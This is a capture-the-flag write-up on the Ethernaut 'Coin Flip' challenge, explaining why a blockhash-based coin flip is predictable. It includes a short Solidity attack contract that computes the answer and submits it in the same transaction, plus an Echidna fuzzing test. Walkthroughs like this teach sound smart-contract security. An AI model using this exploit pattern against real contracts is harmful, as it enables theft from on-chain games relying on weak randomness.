---
title: Ethernaut 03 Coin Flip
author: man715
date: 2022-08-05
categories: [Smart Contract, Write-up]
tags: [write-up, hacking, smart-contract]
math: true
mermaid: true
image:
  path: 
  width: 800
  height: 500
  alt: 
---

# Introduction
The objective of this challenge is to correctly guess the coin flip ten consecutive times. This challenge demonstrates the difficulty of creating randomness in a deterministic system such as the blockchain. Since all the validator nodes need to come to the same exact answer, it is impossible to have a truly random result for each time the code is executed. 

# Assessment
Knowing our objective is to win the coin flip 10 consecutive times, we will first look at how the coin flip is determined by analyzing the `flip()` function. 

```js
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

Looking at this function, we see that the developers are using the the block number minus one to generate a pseudo random number.  

## Vulnerability
The issue with using the block number as a pseudo random number is that it can be predicted. Using a malicious smart contract, an attacker can create the same exact pseudo random number to generate what the coin flip is going to be then in the same transaction submit the answer to the target contract.

# Exploitation
To exploit this vulnerability, we will need to first create our own smart contract that will generate the pseudo random number and create the answer that will be submitted to the target contract.

```js
pragma solidity ^0.6.0;

interface Victim { 
    function flip(bool) external returns(bool);
}

contract CoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    Victim victim = Victim(0xf36B5b5001edBAB9a9371bc7865E4b60fa4B4E82);
    
    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1 ));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victim.flip(side);
    }
}
```

Much of this code should look familiar because it is simply copied from the target contract. For instance, we take the `FACTOR`, `blockValue`, `coinFlip`, and the `side` code directly from the target because that is how the answer is determined. We then send the target contract the guess which uses the same block number since the attacker code and the target code are ran in the same transaction. 

# Lesson(s)
Randomness on a deterministic system is impossible. You must find a way to generate a number from several sources and one needs to be from a source that cannot be known before hand. 

# Fuzzing with Echidna
To successfully and predictably break the contract, we should be able to not only guess 10 consecutive times but even 100 or more times. When I run the test for greater than 10 times, the fuzzer is able to make the contract fail using multiple senders. However, test it for 100 times or more. with using `psender` or `sender` the invariant does not fail. 

The fuzzer does potentially lead you down the right path for solving this issue as it does cause the invariant to fail on 10 consecutive tries with time/block delays. However, in my testing it does not help discern what delay will give consistent predictable results. 

One thing to note is that the solution to this problem is not using a delay but instead to use the block hash to determine if the coin flip result will be heads or tails. 

# Setup
This does not require any setup.

# Test Setup

```javascript
function echidna_test_flip() public view returns(bool) {
        return consecutiveWins <= 10;
    }
```

I tested with the consecutiveWins at 10, 50, and 100.

## Run Test
```shell
echidna-test --config config.yaml Test.sol --contract Test
```

https://github.com/man715/echidna-ctf/tree/main/ethernaut